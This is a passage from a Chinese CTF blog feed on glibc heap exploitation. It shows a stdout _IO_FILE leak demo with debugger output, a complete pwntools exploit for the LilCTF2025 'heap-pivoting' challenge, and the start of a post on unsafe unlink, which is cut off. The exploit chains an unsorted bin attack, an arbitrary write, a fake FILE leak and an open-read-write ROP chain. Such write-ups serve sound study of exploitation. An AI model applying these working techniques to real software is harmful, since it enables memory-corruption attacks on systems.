class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stdout addr is --&gt; %p\n&quot;</span>, stdout_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- input &gt;&gt;&gt;\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, victim, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---- leak  &gt;&gt;&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//全缓冲</span></span><br><span class="line">    *(<span class="type">int</span>*)stdout_addr = <span class="number">0xfbad1800</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">1</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_ptr</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">2</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_end</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">3</span>] = <span class="number">0</span>;              <span class="comment">// _IO_read_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">4</span>] = (<span class="type">uint64_t</span>)victim;           <span class="comment">// _IO_write_base</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">5</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x10</span>;    <span class="comment">// _IO_write_ptr  必须大于 base 才会写出</span></span><br><span class="line">    ((<span class="type">uint64_t</span>*)stdout_addr)[<span class="number">6</span>] = (<span class="type">uint64_t</span>)victim + <span class="number">0x100</span>;    <span class="comment">// _IO_write_end &gt; ptr </span></span><br><span class="line"></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new_data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">new_data</span><br><span class="line">[Inferior 1 (process 76592) exited normally]</span><br></pre></td></tr></table></figure><p><code>fflush(stdout)</code>后可以成功输出leak的数据，而全缓冲模式，缓冲区未填满后续的new_data则需要<code>exit</code>刷新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exit()</span><br><span class="line">  └─ _IO_cleanup()</span><br><span class="line">       └─ _IO_flush_all_lockp(NULL)</span><br><span class="line">            ├─ 遍历全局 FILE* 链表 _IO_list_all</span><br><span class="line">            └─ 对每个 FILE 调用 _IO_file_overflow/_IO_do_write 进行 flush</span><br></pre></td></tr></table></figure><p>如果我们填满缓冲区（笔者本地默认0x400）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x81</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new_data&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b exit</span><br><span class="line">Breakpoint 1 at 0x7ffff7c455f0: file ./stdlib/exit.c, line 142.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/stdout/demo</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">printf addr is --&gt; 0x7ffff7c606f0</span><br><span class="line">stdout addr is --&gt; 0x7ffff7e1b780</span><br><span class="line">---- input &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">---- leak  &gt;&gt;&gt;</span><br><span class="line">a</span><br><span class="line">new_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_datanew_data</span><br><span class="line">Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142</span><br></pre></td></tr></table></figure><p>而如果仅仅设置输出0x100的数据（<code>_IO_write_end</code>&#x3D;<code>victim+0x100</code>）,是仍然没有输出的，显然缓冲区大小不是通过<code>write</code>三元组来判定的</p><h2 id="0x04-LilCTF2025-heap-pivoting"><a href="#0x04-LilCTF2025-heap-pivoting" class="headerlink" title="0x04 LilCTF2025 heap-pivoting"></a>0x04 LilCTF2025 heap-pivoting</h2><p>开了沙箱，打<code>orw</code>，问题是没有show函数，而且全程没有调用io的函数，但是没有开pie，又是静态编译，相当于给了libc地址，我们能做的只有一个<code>unsorted bin attack</code>，这个时候问题就来了，往哪里写，大家如果了解过<code>unsorted bin attack</code>的话，就会知道我们写的其实是<code>top chunk</code>的地址（<code>main_arena</code>中的一定偏移处），就可以根据这个，修改<code>top chunk</code>的位置，迁移到<code>chunk_list</code>上面，达到任意地址写，然后调用<code>fflush</code>，打<code>stdout</code>，泄露栈地址（<code>rsp</code>），最后劫持<code>rsp</code>写<code>rop</code>就行（此题程序执行到这里自己会<code>ret</code>，也就是<code>pop rip</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.23-0ubuntu3/amd64/libc6_2.23-0ubuntu3_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;gz.imxbt.cn&quot;</span></span><br><span class="line">port = <span class="number">20119</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">set glibc 2.23</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your exploit here</span></span><br><span class="line">menu = <span class="string">b&#x27;Your choice:\n&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">idx, data</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;say\n&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;context: &#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myexit</span>():</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chunk_list = <span class="number">0x6ccd60</span></span><br><span class="line"><span class="comment">#global_max_fast = 0x6cc638</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leave_ret = 0x400aa5</span></span><br><span class="line"><span class="comment">#syscall = 0x4003da</span></span><br><span class="line"><span class="comment">#pop_rax_ret = 0x41fc84</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401a16</span></span><br><span class="line">pop_rdx_rsi_ret = <span class="number">0x443159</span></span><br><span class="line">ret = <span class="number">0x4002e1</span> </span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">alloc(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x6ca858</span>) + p64(chunk_list - <span class="number">0x10</span>))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(chunk_list) + p64(<span class="number">0</span>) + p64(<span class="number">0x6ca858</span>)*<span class="number">2</span>) <span class="comment">#这里就是修改main_arena, 0x6ca858是unsortedbin头地址</span></span><br><span class="line">alloc(<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment">#这里chunk4就是chunk_list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">addr, data</span>): <span class="comment">#任意地址写</span></span><br><span class="line">    edit(<span class="number">4</span>, p64(addr))</span><br><span class="line">    edit(<span class="number">2</span>, data) <span class="comment">#堆头0x10,所以写入地址位于chunk_list[2]</span></span><br><span class="line"></span><br><span class="line">fflush = <span class="number">0x416770</span></span><br><span class="line">environ = <span class="number">0x6cc640</span></span><br><span class="line">stdout = <span class="number">0x6ca300</span></span><br><span class="line">free_hook = <span class="number">0x6cc5e8</span></span><br><span class="line"></span><br><span class="line">fake_io = p64(<span class="number">0xfbad1800</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line">fake_io += p64(environ)  <span class="comment"># _IO_write_base</span></span><br><span class="line">fake_io += p64(environ + <span class="number">0x10</span>)  <span class="comment"># _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">hack(stdout, fake_io)</span><br><span class="line">hack(free_hook, p64(fflush))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># fflush(0) 效果是刷新所有输出方向的io流</span></span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak addr in stack --&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">rsp = leak_addr - <span class="number">0x180</span></span><br><span class="line">log.info(<span class="string">&quot;rsp --&gt; &quot;</span>+<span class="built_in">hex</span>(rsp))</span><br><span class="line"></span><br><span class="line">rop_chain = p64(pop_rdi_ret) + p64(rsp - <span class="number">0x8</span>) + \</span><br><span class="line">        p64(pop_rdx_rsi_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(<span class="number">0x43fc40</span>) + \</span><br><span class="line">        p64(pop_rdi_ret) + p64(<span class="number">3</span>) + \</span><br><span class="line">        p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(rsp + <span class="number">0x100</span>) + \</span><br><span class="line">        p64(<span class="number">0x43fca0</span>) + \</span><br><span class="line">        p64(pop_rdi_ret) + p64(<span class="number">1</span>) + \</span><br><span class="line">        p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(rsp + <span class="number">0x100</span>) + \</span><br><span class="line">        p64(<span class="number">0x43fd00</span>)</span><br><span class="line"></span><br><span class="line">hack(rsp-<span class="number">0x8</span>, <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span> + rop_chain)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于unsafe unlink与unsortedbin attack</title>
      <link href="/2025/08/18/%E5%85%B3%E4%BA%8Eunsafe-unlink%E4%B8%8Eunsortedbin-attack/"/>
      <url>/2025/08/18/%E5%85%B3%E4%BA%8Eunsafe-unlink%E4%B8%8Eunsortedbin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在打lilctf的一道堆题的时候意识到自己还没记录过关于<code>unsafe unlink</code>与<code>unsortedbin attack</code>,于是来记录一下</p><h2 id="0x01-关于unsafe-unlink"><a href="#0x01-关于unsafe-unlink" class="headerlink" title="0x01 关于unsafe unlink"></a>0x01 关于unsafe unlink</h2><p>从双向链表取出chunk的过程即为unlink（在 glibc 源码中，<code>unlink</code> 是一个宏&#x2F;函数，用来把一个双向链表中的 bin 链接节点（chunk）移除）,如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">      || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">          fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">          p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">          p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>什么时候会进行unlink呢？一是<code>free</code> 合并相邻空闲<code>chunk</code>时，需要把相邻块从bin中移除；<code>malloc</code>从 bin 中取出 <code>chunk</code>时，需要把该<code> chunk</code> 从 bin 中移除。当然还有一些特殊情况时候也会进行<code>unlink</code>，不赘述<br>既然是<code>unsafe unlink</code>，我们看其检查机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p>主要就是检查<code>presize</code>和<code>size</code>是否相同，以及要求<code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code>（也就是双向链表的完整性）<br>如果我们修改<code>P-&gt;fd</code>和<code>P-&gt;bk</code>并且绕过上面的检查，也就可以进行一些“unsafe”的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>也就是可以利用这里进行攻击<br>话不多说写个demo调试（使用how2heap的源码并进行了一些修改）就明白了（于glibc2.35）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> chunk_list[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x420</span>; </span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); </span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); </span><br><span class="line">chunk_list[<span class="number">0</span>] = (<span class="type">uint64_t</span>) chunk0_ptr;</span><br><span class="line">chunk_list[<span class="number">1</span>] = (<span class="type">uint64_t</span>) chunk1_ptr;</span><br><span class="line"></span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) chunk_list - (<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) chunk_list - (<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = <span class="number">0x421</span>;</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> victim_str[<span class="number">8</span>] = <span class="string">&quot;victim&quot;</span>;</span><br><span class="line"><span class="type">char</span> hacked[<span class="number">8</span>] = <span class="string">&quot;hacked&quot;</span>;</span><br><span class="line">*((<span class="type">uint64_t</span>*)chunk_list[<span class="number">0</span>]+<span class="number">3</span>) = (<span class="type">uint64_t</span>) victim_str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------- original vaule of victim_str is -------\n%s\n&quot;</span>, victim_str);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)chunk_list[<span class="number">0</span>], hacked);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------- new vaule of victim_str is      -------\n%s\n&quot;</span>, victim_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很多时候都会使用一个全局的<code>chunk_list</code>来管理各个<code>chunk</code>，而这也给了<code>unsafe unlink</code>可乘之机，直接开始调试<br>进行到0x421那一行后，我们看堆布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 